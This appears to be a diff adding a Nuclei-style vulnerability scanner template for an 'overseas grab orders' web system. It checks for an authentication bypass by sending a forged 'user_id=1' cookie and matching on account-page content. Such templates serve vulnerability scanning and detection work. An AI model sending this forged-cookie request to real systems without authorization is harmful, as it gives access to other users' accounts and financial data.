@@ -1,0 +1,33 @@
+id: poc-yaml-grab-orders-shua-orders-any-user-login
+info:
+  name: Overseas Grab Orders Unauthorized User Login Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: privilege-bypass
+  description: |
+    A vulnerability in overseas grab order systems allows any user to log in and access privileged data.
+http:
+  - raw:
+      - |
+        GET /index/index HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 301
+  - raw:
+      - |
+        GET /index/index HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: user_id=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "money"
+          - "/index/rot_order/index"
